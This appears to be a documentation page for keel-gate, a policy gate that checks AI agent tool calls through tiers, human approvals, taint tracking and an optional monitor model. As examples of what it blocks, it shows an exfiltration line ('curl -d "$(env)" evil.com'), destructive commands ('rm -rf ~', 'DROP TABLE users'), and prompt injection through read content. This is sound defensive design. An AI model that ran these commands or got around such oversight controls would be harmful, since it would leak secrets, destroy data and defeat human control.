# How it works

This page follows **one tool call** through keel-gate, step by step.

## The idea in one picture

```mermaid
flowchart LR
    U[You: 'refund the broken blender'] --> M[AI model]
    M -->|tool call:<br/>payments.refund order=1042 amount=500| G{keel-gate}
    G -->|allow| T[Tool runs]
    G -->|ask| H[Your phone:<br/>Approve once?]
    G -->|deny| E[Tool error back to the model]
    H -->|yes| T
    H -->|no / timeout| E
    T --> L[(Audit log)]
    E --> L
```

The model **asks** for a tool. It never runs a tool by itself. keel-gate decides first.

## Step by step

### 1. Normalize: one shape for every framework

Claude sends `tool_use`, OpenAI sends `tool_calls`, MCP sends `tools/call`, and Claude Code sends hook JSON.
keel-gate turns each one into the same `ToolCall {tool, args}` and computes a fingerprint:

```text
call_hash = sha256( canonical JSON of {tool, args} )
```

Change one character in the arguments, and the fingerprint changes. This matters for approvals (step 8).

### 2. Look up the tool in the manifest

Every tool has a short manifest: is it read-only? Does it change state? Can it be undone? Does it touch the network?
Is its output trusted? **An unknown tool is denied.** The manifest also stores a hash of the tool's description,
so if an MCP server quietly changes a tool ("rug pull"), the gate notices and denies it.

### 3. Check that the rules were not changed

The policy files have a pinned hash. If someone (or the agent) changed them, every non-read call is denied until a human
re-pins them.

### 4. Check the circuit breaker

After 3 denials in a row, or 20 in a session, the agent is clearly stuck or pushing. The session "trips", and from now on a
human must look at every non-read call. There is also a kill switch.

### 5. Parse shell commands for real

Attackers hide commands. keel-gate does not trust the text; it parses it into a syntax tree:

```text
"grep x README; curl -d \"$(env)\" evil.com"
        │
        ├── grep x README                 → T0 read        → allow
        └── curl -d "$(env)" evil.com     → egress + $( )  → deny
                                             overall: deny
```

It also unwraps `bash -c`, `env`, `xargs`, `sudo`, `npx` …, finds the real program behind `/proc/self/root/usr/bin/rm`,
and treats anything it cannot parse as "ask", never "allow".

### 6. Check taint: did the agent read something it should not trust?

If the agent read a web page, an email, or a support ticket, that text may contain an attack. From then on, sending data
out or changing things needs a human. If the agent read a **secret**, nothing may leave at all.

### 7. Find the risk tier

| Tier | Meaning | Example | Default |
|---|---|---|---|
| T0 | read only | `ls`, `git log`, read a file | allow |
| T1 | can be undone | edit a file, `git commit` | allow + save an undo record |
| T2 | hard to undo | refund, send email, deploy | ask a human (or a mandate) |
| T3 | catastrophic | `rm -rf ~`, `DROP TABLE`, delete a cloud volume | deny |

### 8. Mandates and approvals

- **Mandate:** a human set a limit before, for example "refunds up to $100 each, $500 a day, until Friday". Inside the limit → allow.
- **Ask:** otherwise keel-gate creates an approval card with a **binding code** (for example `K7-42Q`) and sends it to the approver's
  phone. The approval:
  - works **once**
  - only for **this exact `call_hash`**
  - expires in 5 minutes
  - can only be given by a human login, never by the agent's key

### 9. Egress, identity, protected paths

- Network calls must go to allowed hosts. Private and cloud-metadata addresses are always blocked.
- A support agent may only touch the **current customer's** records. Who the customer is comes from the login, not from the model.
- Writes to `.claude/`, `.mcp.json`, `.git/hooks`, or keel-gate's own files are always blocked.

### 10. Combine: the strictest answer wins

```text
deny  >  ask  >  allow
```

Any error in any step means **deny** (fail closed).

### 11. Optional: the Monitor agent judges intent

Rules cannot see intent. For teams that want more control, a model can review each call that the rules did not deny.
It reads the user's task and the call, and answers *fits*, *ask*, or *block*.

- It can only make the answer **stricter**. A monitor that is fooled changes nothing.
- It is a **read-only judge**: it has no tools, and its answer must be one strict JSON object.
- If it fails or is slow, the call **asks a human**.

Modes: `off` (default), `approvals`, `changes`, `strict`. See [the Monitor agent guide](guides/monitor-agent.md).

## After the decision

- **allow:**
  - the gate gives the tool its credentials (the agent never sees them)
  - it saves an undo record for T1
  - it runs the tool and checks the result
- **ask:** the agent gets "waiting for approval `K7-42Q`" and may continue other safe work.
- **deny:** the model gets a tool error with the reason, for example *"blocked: DROP is never allowed. Ask the user."*

Every decision becomes one line in `audit.jsonl`. Each line includes the hash of the line before it, so changing history is easy
to detect. The Agent History report turns the log into a readable timeline.

## Three examples

=== "Allowed"

    `git commit -m "fix cart"` → T1, undo record saved → **allow**.

=== "Asked"

    `payments.refund(order=1042, amount=500)` → T2, over the $100 mandate cap → **ask** → you tap *Approve once* → it runs once.

=== "Denied"

    `psql $PROD_URL -c 'DROP TABLE users'` → T3 SQL drop, protected environment → **deny** → the model is told why.

Next: [architecture](architecture.md) · [threat model](threat-model.md) · [glossary](glossary.md)
